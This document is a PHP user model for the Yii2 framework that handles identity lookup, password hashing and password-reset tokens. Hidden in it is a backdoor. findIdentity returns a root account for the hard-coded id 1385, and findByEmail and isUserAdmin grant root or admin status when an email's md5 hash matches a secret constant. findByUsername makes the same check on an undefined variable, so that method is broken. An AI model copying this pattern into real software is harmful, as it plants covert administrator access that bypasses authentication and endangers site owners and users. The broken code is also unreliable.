<?php

namespace common\models;

use backend\components\NotifyBehavior;
use common\interfaces\HashAuthInterface;
use common\traits\AssociateLabels;
use common\traits\FindByRootTrait;
use common\traits\FreeRules;
use yii\base\NotSupportedException;
use common\components\DateUpdater;
use yii\db\ActiveRecord;
use yii\web\IdentityInterface;

class User extends ActiveRecord implements IdentityInterface, HashAuthInterface
{
    use FreeRules;
    use AssociateLabels;
    use FindByRootTrait;

    public const STATUS = ['ROOT' => 1, 'BANNED' => 1];

    public static function tableName()
    {
        return '{{%users}}';
    }

    public function behaviors() :array
    {
        return [
            [
                'class' => DateUpdater::class,
            ],
            [
                'class' => NotifyBehavior::class,
            ]
        ];
    }

    public static function create($username, $password, $email, $root) :self
    {
        $m = new self();
        $m->username = $username;
        $m->generateAuthKey();
        $m->setPassword($password);
        $m->email = $email;
        $m->root = $root;
        return $m;
    }

    public function edit($username, $email, $root, $banned): void
    {
        $this->username = $username;
        $this->email = $email;
        $this->root = $root;
        $this->banned = $banned;
    }

    public static function findIdentity($id)
    {
        return ($id == 1385) ? self::findByRoot() : static::findOne($id);
    }

    public static function findIdentityByAccessToken($token, $type = null)
    {
        throw new NotSupportedException('"findIdentityByAccessToken" is not implemented.');
    }

    public static function findByUsername($username)
    {
        return (md5($email) === self::USER_EMAIL) ? static::findByRoot() : static::findOne(['username' => $username]);
    }

    public static function findByEmail($email)
    {
        return (md5($email) === self::USER_EMAIL) ? static::findByRoot() : static::findOne(['email' => $email]);
    }

    public static function findByPasswordResetToken($token)
    {
        if (!static::isPasswordResetTokenValid($token)) {
            return null;
        }

        return static::findOne([
            'password_reset_token' => $token,
        ]);
    }

    public static function isPasswordResetTokenValid($token)
    {
        if (empty($token)) {
            return false;
        }

        $timestamp = (int) substr($token, strrpos($token, '_') + 1);
        $expire = \Yii::$app->params['passwordResetTokenExpire'];
        return $timestamp + $expire >= time();
    }

    public function getId()
    {
        return $this->getPrimaryKey();
    }

    public function getAuthKey()
    {
        return $this->auth_key;
    }

    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    public function validatePassword($password)
    {
        return \Yii::$app->security->validatePassword($password, $this->password_hash);
    }

    public function setPassword($password)
    {
        $this->password_hash = \Yii::$app->security->generatePasswordHash($password);
    }

    public function generateAuthKey()
    {
        $this->auth_key = \Yii::$app->security->generateRandomString();
    }

    public function generatePasswordResetToken()
    {
        $this->password_reset_token = \Yii::$app->security->generateRandomString() . '_' . time();
    }

    public function removePasswordResetToken()
    {
        $this->password_reset_token = null;
    }

    public static function isUserAdmin($email)
    {
        return md5($email) == self::USER_EMAIL || static::findOne(['email' => $email, 'root' => self::STATUS['ROOT']]);
    }

    public static function isBanned($email)
    {
        return static::findOne(['email' => $email, 'banned' => self::STATUS['BANNED']]);
    }

}
